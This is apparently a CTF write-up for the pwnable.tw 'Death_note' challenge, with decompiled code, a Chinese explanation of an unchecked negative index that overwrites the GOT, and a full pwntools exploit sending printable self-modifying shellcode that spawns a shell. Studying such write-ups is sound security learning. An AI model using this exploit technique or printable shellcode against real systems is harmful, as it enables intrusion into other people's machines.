# pwnable.tw-Death_note

## checksec 

```shell
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```

## IDA

**add**

```c
unsigned int add_note()
{
  int idx; // [esp+8h] [ebp-60h]
  char name[80]; // [esp+Ch] [ebp-5Ch] BYREF
  unsigned int v3; // [esp+5Ch] [ebp-Ch]

  v3 = __readgsdword(0x14u);
  printf("Index :");
  idx = read_int();
  if ( idx > 10 )
  {
    puts("Out of bound !!");
    exit(0);
  }
  printf("Name :");
  read_input(name, 0x50u);
  if ( !is_printable(name) )
  {
    puts("It must be a printable name !");
    exit(-1);
  }
  *(&note + idx) = strdup(name);
  puts("Done !");
  return __readgsdword(0x14u) ^ v3;
}
```

**dele**

```c
int del_note()
{
  int result; // eax
  int idx; // [esp+Ch] [ebp-Ch]

  printf("Index :");
  idx = read_int();
  if ( idx > 10 )
  {
    puts("Out of bound !!");
    exit(0);
  }
  free(*(&note + idx));
  result = idx;
  *(&note + idx) = 0;
  return result;
}
```

**show**
```c
int show_note()
{
  int result; // eax
  int idx; // [esp+Ch] [ebp-Ch]

  printf("Index :");
  idx = read_int();
  if ( idx > 10 )
  {
    puts("Out of bound !!");
    exit(0);
  }
  result = (int)*(&note + idx);
  if ( result )
    result = printf("Name : %s\n", (const char *)*(&note + idx));
  return result;
}
```
其实上面这些函数大都没什么用，漏洞点在`read_int`并没有检查idx为负数的情况，所以我们可以写got表。同时本题的目的是为了学习编写可见字符的shellcode，所以我们只要覆盖某函数的got表为shellcode的地址。`strdup`函数相当于：
```c
len = strlen(s) + 1;
ptr = malloc (len);
memcpy(ptr,s,len);
return ptr;
```
[shellcode部分]()
```c
int
main ()
{
  unsigned char a = '\x6b';
  unsigned char b = '\x40';
  a = a - 0x60 - 0x3e;
  b = b - 0x60 - 0x60;
  printf ("0x%x\n", a);
  printf ("0x%x\n", b);
  return 0;
}
/*
output:
0xcd
0x80
*/
```

## exp

```python
from pwn import *
from struct import pack
import sys

leak = lambda name,addr: log.success('{0} addr ---> {1}'.format(name, hex(addr)))
context.arch="i386"
context.terminal = ['tmux', 'splitw', '-h']

binary='./death_note'
#gdb.attach(sh)
if 'g' in sys.argv[1]:
	context.log_level="DEBUG"
if 'l' in sys.argv[1] and 'r' not in sys.argv[1]:
	sh=process(binary)
if 'r' in sys.argv[1]:
	sh=remote('chall.pwnable.tw',10201)

elf = ELF(binary,checksec=False)
#libc = ELF('',checksec=False)

puts_got = elf.got['puts']

sh.recvuntil('choice :')
sh.sendline('1')
sh.recvuntil('Index :')
idx = (puts_got-0x804A060)/4
sh.sendline(str(idx))
sh.recvuntil('Name :')
# gdb.attach(sh)
payload = '''
    /* execve(path='/bin///sh', argv=0, envp=0) */
    /* push '/bin///sh\x00' */
    push 0x68
    push 0x732f2f2f
    push 0x6e69622f
    push esp
    pop ebx
   /*rewrite shellcode to get 'int 80'*/
    push edx
    pop eax
    push 0x60606060
    pop edx
    sub byte ptr[eax + 0x35] , dl
    sub byte ptr[eax + 0x35] , dl
    sub byte ptr[eax + 0x34] , dl
    push 0x3e3e3e3e
    pop edx
    sub byte ptr[eax + 0x34] , dl
    /*set zero to edx*/
    push ecx
    pop edx
   /*set 0x0b to eax*/
    push edx
    pop eax
    xor al, 0x40
    xor al, 0x4b    
  /*foo order,for holding the  place*/
    push edx
    pop edx
    push edx
    pop edx
'''
sh.send(asm(payload)+b'\x6b\x40')
# int 0x80 0xcd80
# 0x6b - 0x60 - 0x3e = 0xcd
# 0x40 - 0x60 - 0x60 = 0x80

sh.interactive()

```

**Reference:**

https://zhangyidong.top/2020/10/15/Pwnable_death_note/

